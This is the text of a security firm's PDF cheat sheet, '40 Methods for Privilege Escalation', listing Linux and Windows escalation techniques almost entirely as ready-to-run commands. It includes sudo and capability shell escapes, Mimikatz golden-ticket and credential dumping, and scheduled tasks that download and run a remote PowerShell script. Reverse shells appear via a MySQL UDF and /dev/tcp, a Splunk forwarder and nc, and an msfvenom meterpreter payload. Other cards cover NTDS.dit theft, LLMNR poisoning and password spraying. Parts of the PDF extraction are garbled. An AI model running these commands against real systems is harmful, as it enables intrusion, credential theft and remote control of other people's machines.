@@ -1,0 +1,1172 @@
+=== 40 Methods for Privilege Escalation.pdf ===
+Total Pages: 186
+============================================================
+
+40 METHODS FOR PRIVILEGE
+ESCALATION
+PART 1
+HADESS | SECURE AGILE DEVELOPMENT
+WWW.HADESS.IO
+
+Domain: No
+Local Admin: Yes
+​
+OS: Linux
+Type:  Abusing Privileged Files
+sudo vim -c ':!/bin/bash'
+sudo find / etc/passwd -exec /bin/bash \;
+echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --
+script=/tmp/shell.nse
+sudo env /bin/bash
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo perl -e 'exec "/bin/bash";'
+sudo python -c 'import pty;pty.spawn("/bin/bash")'
+sudo less /etc/hosts - !bash
+sudo man man - !bash
+sudo ftp - ! /bin/bash
+Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234
+Victim 
+= 
+sudo 
+socat 
+exec:'sh 
+-li',pty,stderr,setsid,sigint,sane
+tcp:192.168.1.105:1234
+echo test > notes.txt
+sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"
+sudo gcc -wrapper /bin/bash,-s .
+ABUSING SUDO BINARIES
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Y/N
+Local Admin: Yes
+​
+OS: Linux
+Type: Abusing Scheduled Tasks
+echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
+chmod +x /home/user/systemupdate.sh
+Wait a while
+/bin/bash -p
+id && whoami
+ABUSING SCHEDULED TASKS
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abusing Scheduled Tasks
+1.mimikatz# token::elevate
+2.mimikatz# vault::cred /patch
+3.mimikatz# lsadump::lsa /patch
+4.mimikatz# kerberos::golden /user:Administrator /rc4:<Administrator
+NTLM(step 3)> /domain:<DOMAIN> /sid:<USER SID> /sids:<Administrator
+SIDS> /ticket:<OUTPUT TICKET PATH>
+5.powercat -l -v -p 443
+6.schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM"
+/TN 
+"enterprise" 
+/TR 
+"powershell.exe-c 
+'iex 
+(iwr
+http://10.10.10.10/reverse.ps1)'”
+7.schtasks /run /s DOMAIN /TN "enterprise”
+GOLDEN TICKET WITH SCHEDULED TASKS
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Linux
+Type: Abusing Capabilities
+getcap -r / 2>/dev/null         
+1.
+/usr/bin/python2.6 = cap_setuid+ep
+a.
+/usr/bin/python2.6 
+-c 
+'import 
+os; 
+os.setuid(0);
+os.system("/bin/bash")'
+b.
+id && whoami
+c.
+getcap -r / 2>/dev/null         
+2.
+/usr/bin/perl = cap_setuid+ep
+a.
+/usr/bin/perl 
+-e 
+'use 
+POSIX 
+(setuid); 
+POSIX::setuid(0); 
+exec
+"/bin/bash";'
+b.
+id && whoami
+c.
+ABUSING INTERPRETER CAPABILITIES
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Linux
+Type: Abusing Capabilities
+getcap -r / 2>/dev/null         
+1.
+/usr/bin/tar = cap dac read search+ep
+2.
+/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
+3.
+/usr/bin/tar -xvf key.tar
+4.
+openssl req -engine /tmp/priv.so
+5.
+/bin/bash -p
+6.
+id && whoami
+7.
+ABUSING BINARY CAPABILITIES
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Windows
+Type: Abusing Capabilities
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data
+/module_source/lateral_movement/Invoke-SQLOSCmd.ps1
+1.
+. .\Heidi.ps1
+2.
+Invoke-SQLOCmd -Verbose -Command “net localgroup administrators
+user1 /add” -Instance COMPUTERNAME
+3.
+ABUSING ACTIVESESSIONS CAPABILITIES
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abusing Capabilities
+1. . .\PowerUpSQL.ps1
+1.
+2. Get-SQLInstanceLocal -Verbose
+2.
+3. (Get-SQLServerLinkCrawl -Verbos -Instance "10.10.10.10" -Query 'select * from
+master..sysservers').customer.query
+3.
+4. 
+4.
+USE "master";
+5.
+SELECT 
+*, 
+SCHEMA_NAME("schema_id") 
+AS 
+'schema' 
+FROM
+"master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
+6.
+execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE
+NAME>"
+7.
+5. powershell -ep bypass
+8.
+6. Import-Module .\powercat.ps1
+9.
+7. powercat -l -v -p 443 -t 10000
+10.
+8.
+11.
+SELECT 
+*, 
+SCHEMA_NAME("schema_id") 
+AS 
+'schema' 
+FROM
+"master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
+12.
+execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE
+NAME>" 
+13.
+execute('exec master..xp_cmdshell "\\10.10.10.10\reverse.exe"') at "<DOMAIN>\
+<DATABASE NAME>"
+14.
+ESCALATE WITH TRUSTWORTHY IN SQL SERVER
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abusing Services
+ps aux | grep root
+1.
+mysql -u root -p
+2.
+\! chmod +s /bin/bash
+3.
+Exit
+4.
+/bin/bash -p 
+5.
+id && whoami
+6.
+ABUSING MYSQL RUN AS ROOT
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Linux
+Type: Abusing Services
+Journalctl
+1.
+!/bin/sh
+2.
+ABUSING JOURNALCTL
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Windows
+Type: Abusing Services
+. .\PowerUp.ps1
+1.
+Invoke-ServiceAbuse -Name ‘vds’ -UserName ‘domain\user1’
+2.
+ABUSING VDS
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Windows
+Type: Abusing Services
+. .\PowerUp.ps1
+1.
+Invoke-ServiceAbuse -Name ‘browser’ -UserName ‘domain\user1’
+2.
+ABUSING BROWSER
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Linux
+Type: Abusing Services
+0. exec ldapmodify -x -w PASSWORD
+1.
+1. paste this
+2.
+dn: cn=openssh-lpk,cn=schema,cn=config
+3.
+objectClass: olcSchemaConfig
+4.
+cn: openssh-lpk
+5.
+olcAttributeTypes: ( 1.3.6.1.4.1.24552.500.1.1.1.13 NAME 'sshPublicKey' 
+6.
+  DESC 'MANDATORY: OpenSSH Public key'
+7.
+  EQUALITY octetStringMatch
+8.
+  SYNTAX 1.3.6.1.4.1.1466.115.121.1.40 )
+9.
+olcObjectClasses: ( 1.3.6.1.4.1.24552.500.1.1.2.0 NAME 'ldapPublicKey' SUP top AUXILIARY
+10.
+  DESC 'MANDATORY: OpenSSH LPK objectclass'
+11.
+  MAY ( sshPublicKey $ uid ) 
+12.
+  )
+13.
+14.
+2. exec ldapmodify -x -w PASSWORD
+15.
+3. paste this
+16.
+dn: uid=UID,ou=users,ou=linux,ou=servers,dc=DC,dc=DC
+17.
+changeType: modify
+18.
+add: objectClass
+19.
+objectClass: ldapPublicKey
+20.
+-
+21.
+add: sshPublicKey
+22.
+sshPublicKey: content of id_rsa.pub
+23.
+-
+24.
+replace: EVIL GROUP ID
+25.
+uidNumber: CURRENT USER ID
+26.
+-
+27.
+replace: EVIL USER ID
+28.
+gidNumber: CURRENT GROUP ID
+29.
+ABUSING LDAP
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Abusing Services
+1.responder -I eth1 -v
+1.
+2.create Book.url
+2.
+[InternetShortcut]
+3.
+URL=https://facebook.com
+4.
+IconIndex=0
+5.
+IconFile=\\attacker_ip\not_found.ico
+6.
+LLMNR POISONING
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Abusing Services
+adcspwn.exe --adcs <cs server> --port [local port] --remote
+[computer]
+1.
+adcspwn.exe --adcs cs.pwnlab.local
+2.
+adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port
+9001
+3.
+adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --
+output C:\Temp\cert_b64.txt
+4.
+adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --
+username pwnlab.local\mranderson --password The0nly0ne! --dc
+dc.pwnlab.local
+5.
+ABUSING CERTIFICATE SERVICES
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Linux
+Type: Injection
+mysql -u root -p
+1.
+mysql> use mysql;
+2.
+mysql> create table admin(line blob);
+3.
+mysql> insert into admin values(load_file('/tmp/lib_mysqludf_sys.so'));
+4.
+mysql> 
+select 
+* 
+from 
+admin 
+into 
+dumpfile
+'/usr/lib/lib_mysqludf_sys.so';
+5.
+mysql> 
+create 
+function 
+sys_exec 
+returns 
+integer 
+soname
+'lib_mysqludf_sys.so';
+6.
+mysql> select sys_exec('bash -i >& /dev/tcp/10.10.10.10/9999 0>&1');
+7.
+MYSQL UDF CODE INJECTION
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Windows
+Type: Injection
+1.SharpImpersonation.exe user:<user> shellcode:<URL>
+1.
+2.SharpImpersonation.exe 
+user:<user>
+technique:ImpersonateLoggedOnuser
+2.
+IMPERSONATION TOKEN WITH IMPERSONATELOGGEDONUSER
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Windows
+Type: Injection
+1.execute-assembly sweetpotato.exe -p beacon.exe
+1.
+IMPERSONATION TOKEN WITH SEIMPERSONTEPRIVILEGE
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Windows
+Type: Injection
+1.EOPLOADDRIVER.exe 
+System\\CurrentControlSet\\MyService
+C:\\Users\\Username\\Desktop\\Driver.sys
+IMPERSONATION TOKEN WITH SELOADDRIVERPRIVILEGE
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Windows/Linux
+Type: Enumeration & Hunt
+locate *.ovpn    
+1.
+OPENVPN CREDENTIALS
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Windows/Linux
+Type: Enumeration & Hunt
+history                            
+1.
+cat /home/<user>/.bash_history     
+2.
+cat ~/.bash_history | grep -i passw
+3.
+BASH HISTORY
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Windows/Linux
+Type: Sniff
+tcpdump -nt -r capture.pcap -A 2>/dev/null | grep -P 'pwd='                    
+1.
+PACKAGE CAPTURE
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Linux
+Type: Remote Procedure Calls (RPC)
+showmount -e <victim_ip>   
+1.
+mkdir /tmp/mount 
+2.
+mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
+3.
+cd /tmp/mount
+4.
+cp /bin/bash .
+5.
+chmod +s bash
+6.
+NFS ROOT SQUASHING
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abuse Privilege
+$user = "megacorp\jorden"
+1.
+$folder = "C:\Users\administrator"
+2.
+$acl = get-acl $folder
+3.
+$aclpermissions 
+= 
+$user, 
+"FullControl", 
+"ContainerInherit,
+ObjectInherit", "None", "Allow"
+4.
+$aclrule 
+= 
+new-object
+System.Security.AccessControl.FileSystemAccessRule
+$aclpermissions 
+5.
+$acl.AddAccessRule($aclrule)
+6.
+set-acl -path $folder -AclObject $acl
+7.
+get-acl $folder | folder
+8.
+ABUSING ACCESS CONTROL LIST
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abuse Privilege
+import-module .\SeBackupPrivilegeUtils.dll
+1.
+import-module .\SeBackupPrivilegeCmdLets.dll
+2.
+Copy-FileSebackupPrivilege 
+z:\Windows\NTDS\ntds.dit
+C:\temp\ndts.dit
+3.
+ESCALATE WITH SEBACKUPPRIVILEGE
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abuse Privilege
+https://github.com/dievus/printspoofer
+1.
+printspoofer.exe -i -c "powershell -c whoami"
+2.
+ESCALATE WITH SEIMPERSONATEPRIVILEGE
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abuse Privilege
+FIRST:
+Download 
+https://github.com/FuzzySecurity/Capcom-
+Rootkit/blob/master/Driver/Capcom.sys
+Download
+https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddri
+ver.cpp
+Download https://github.com/tandasat/ExploitCapcom
+change ExploitCapcom.cpp line 292 
+TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
+to
+TCHAR CommandLine[] = TEXT("C:\\test\\shell.exe");
+then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe
+SECOND:
+1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f
+exe > shell.exe
+2. .\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
+3. .\ExploitCapcom.exe
+4. in msf exec `run`
+ESCALATE WITH SELOADDRIVERPRIVILEGE
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abuse Privilege
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+Import-Module .\PowerView_dev.ps1
+Set-DomainUserPassword -Identity user1 -verbose
+Enter-PSSession -ComputerName COMPUTERNAME -Credential “”
+ESCALATE WITH FORCECHANGEPASSWORD
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abuse Privilege
+$pass = ConvertTo-SecureString 'Password123#' -AsPlainText -Force
+$creds 
+= 
+New-Object
+System.Management.Automation.PSCredential('DOMAIN\MASTER USER'), $pass)
+Set-DomainObject -Credential $creds USER1 -Clear serviceprincipalname
+Set-DomainObject 
+-Credential 
+$creds 
+-Identity 
+USER1 
+-SET
+@{serviceprincipalname='none/fluu'}
+.\Rubeus.exe kerberoast /domain:<DOMAIN>
+ESCALATE WITH GENERICWRITE
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Yes
+​
+OS: Windows
+Type: Abuse Privilege
+1..\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\
+<USER> 
+--Command 
+"cmd.exe" 
+--Arguments 
+"/c 
+net 
+user 
+Administrator
+Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
+ABUSING GPO
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Abuse Ticket
+1..\Rubeus.exe asktgt /user:<USET>$ /rc4:<NTLM HASH> /ptt
+2.klist
+PASS-THE-TICKET
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Abuse Ticket
+1.mimikatz # lsadump::dcsync /user:<USER>
+2.mimikatz # kerberos::golden /user:<USER> /domain:</DOMAIN> /sid:<OBJECT
+SECURITY ID> /rce:<NTLM HASH> /id:<USER ID>
+GOLDEN TICKET
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Linux/Windows
+Type: Abuse Channel
+python PySplunkWhisperer2_remote.py --lhost 10.10.10.5 --host 10.10.15.20 --
+username admin --password admin --payload '/bin/bash -c "rm /tmp/luci11;mkfifo
+/tmp/luci11;cat /tmp/luci11|/bin/sh -i 2>&1|nc 10.10.10.5 5555 >/tmp/luci11"'
+ABUSING SPLUNK UNIVERSAL FORWARDER
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: No
+Local Admin: Yes
+​
+OS: Linux
+Type: Abuse Channel
+gdbus 
+call 
+--system 
+--dest 
+com.ubuntu.USBCreator 
+--object-path
+/com/ubuntu/USBCreator 
+--method 
+com.ubuntu.USBCreator.Image
+/home/nadav/authorized_keys /root/.ssh/authorized_keys true
+ABUSING GDBUS
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Abuse Channel
+Find user in First DC
+1.
+If port 6666 enabled
+2.
+proxychains evil-winrm -u user -p 'pass' -i 10.100.9.253 -P 6666
+3.
+. \mimikatz. exe "privilege:: debug" "sekurlsa:: logonpasswords" "token:: elevate"
+*lsadump:: secrets* *exit"
+4.
+proxychains evil-winrm -u Administrator -p 'pass dumped in step 4' -i
+10.100.10.100 -P 6666
+5.
+ABUSING TRUSTED DC
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: NTLM
+responder -I eth1 -v
+1.
+ntlmrelayx.py …
+2.
+NTLM RELAY 
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: NTLM
+responder -I eth1 -v
+1.
+./exchangeRelayx.py …
+2.
+EXCHANGE RELAY 
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Dumping
+1. priv.txt contain
+SET CONTEXT PERSISTENT NOWRITERSp
+add volume c: alias 0xprashantp
+createp
+expose %0xprashant% z:p
+2. exec with diskshadow /s priv.txt
+DUMPING WITH DISKSHADOW
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Dumping
+vssadmin create shadow /for=C:
+copy 
+\\?
+\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit
+C:\ShadowCopy
+copy 
+\\?
+\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
+TEM C:\ShadowCopy./kerbrute_linux_amd64 passwordspray -d domain.local --dc
+10.10.10.10 domain_users.txt Password123
+DUMPING WITH VSSADMIN
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Spraying
+./kerbrute_linux_amd64 
+passwordspray 
+-d 
+domain.local 
+--dc 
+10.10.10.10
+domain_users.txt Password123
+PASSWORD SPRAYING
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Kerberos
+.\Rubeus.exe asreproast
+AS-REP ROASTING
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+Domain: Yes
+Local Admin: Y/N
+​
+OS: Windows
+Type: Kerberos
+GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
+-request
+crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --
+kerberoast output.txt
+KERBEROASTING
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
+
+HADESS | SECURE AGILE DEVELOPMENT
+About Hadess
+Savior of your Business to combat cyber threats
+Hadess performs offensive cybersecurity services
+through 
+infrastructures 
+and 
+software 
+that
+include vulnerability analysis, scenario attack
+planning, 
+and 
+implementation 
+of 
+custom
+integrated preventive projects. We organized
+our activities around the prevention of corporate,
+industrial, and laboratory cyber threats.
+Contact Us
+To request additional information about Hadess’s services, please fill out the form
+below. A Hadess representative will contact you shortly.
+Email: 
+Marketing@hadess.io
+Phone No.
++989362181112
+Company No.
++982128427515
++982177873383
+Website: 
+www.hadess.io
+hadess_security  
+
+HADESS | SECURE AGILE DEVELOPMENT
+Hadess
+Products and Services
+Fully assess your organization’s threat detection and response
+capabilities with a simulated cyber-attack.
+Penetration Testing | PROTECTION PRO
+Fully assess your organization’s threat detection and response
+capabilities with a simulated cyber-attack.
+Red Teaming Operation | PROTECTION PRO
+Identifying and helping to address hidden weaknesses in
+your organization’s security.
+RASP | Protect Applications and APIs Anywhere
+Identifying and helping to address hidden weaknesses in
+your Applications.
+SAST | Audit Your Products
+
+HADESS
+Secure Agile Development
+
+74 METHODS FOR PRIVILEGE
+ESCALATION
+PART 2
+HADESS | SECURE AGILE DEVELOPMENT
+WWW.HADESS.IO
+
+​
+NO
+Y/N
+Yes
+NO
+NO
+NO
+Y/N
+Y/N
+N
+N
+N
+YES
+YES
+YES
+Y/N
+YES
+YES
+YES
+NO
+NO
+Y/N
+NO
+Y/N
+YES
+No
+PART 1 SUMMARY
+HADESS | SECURE AGILE DEVELOPMENT
+Method
+DOMAIN
+APT
+1
+Abusing Sudo Binaries
+2
+Abusing Scheduled Tasks
+3
+Golden 
+Ticket 
+With
+Scheduled Tasks
+4
+Abusing 
+Interpreter
+Capabilities
+5
+Abusing Binary Capabilities
+6
+Abusing ActiveSessions
+Capabilities
+7
+Escalate with TRUSTWORTHY
+in SQL Server
+8
+Abusing 
+Mysql
+run as root
+No
+Method
+DOMAIN
+APT
+9
+Abusing
+journalctl
+10
+Abusing VDS
+11
+Abusing Browser
+12
+Abusing LDAP
+13
+LLMNR Poisoning
+14
+Abusing 
+Certificate
+Services
+15
+MySQL UDF Code
+Injection
+16
+Impersonation 
+Token 
+with
+ImpersonateLoggedOnuser
+No
+Method
+DOMAIN
+APT
+17
+Impersonation Token with
+SeImpersontePrivilege
+18
+Impersonation Token with
+SeLoadDriverPrivilege
+19
+OpenVPN
+Credentials
+20
+Bash History
+21
+Package Capture
+22
+NFS Root Squashing
+23
+Abusing 
+Access
+Control List
+24
+Escalate 
+With
+SeBackupPrivilege
+
+No
+​
+PART 1 SUMMARY
+HADESS | SECURE AGILE DEVELOPMENT
+Method
+DOMAIN
+APT
+25
+Escalate 
+With
+SeImpersonatePrivilege
+YES
+26
+Escalate 
+With
+SeLoadDriverPrivilege
+YES
+27
+Escalate 
+With
+ForceChangePassword
+YES
+28
+Escalate 
+With
+GenericWrite
+YES
+29
+Abusing GPO
+YES
+30
+Pass-the-Ticket
+YES
+31
+Golden Ticket
+YES
+32
+Abusing 
+Splunk
+Universal Forwarder
+NO
+No
+Method
+DOMAIN
+APT
+33
+Abusing Gdbus
+Y/N
+34
+Abusing Trusted DC
+YES
+35
+NTLM Relay 
+YES
+36
+Exchange Relay 
+YES
+37
+Dumping 
+with
+diskshadow
+YES
+38
+Dumping 
+with
+vssadmin
+YES
+39
+Password Spraying
+Y/N
+40
+AS-REP Roasting
+YES
+
+PART 2 
+
+Domain: No
+Local Admin: Yes
+​
+OS: Linux
+Type:  0/1 Exploit
+gcc -pthread c0w.c -o c0w; ./c0w; passwd; id
+DIRTYC0W
+HADESS | SECURE AGILE DEVELOPMENT
+Difficulty
+APT Used
+Detection
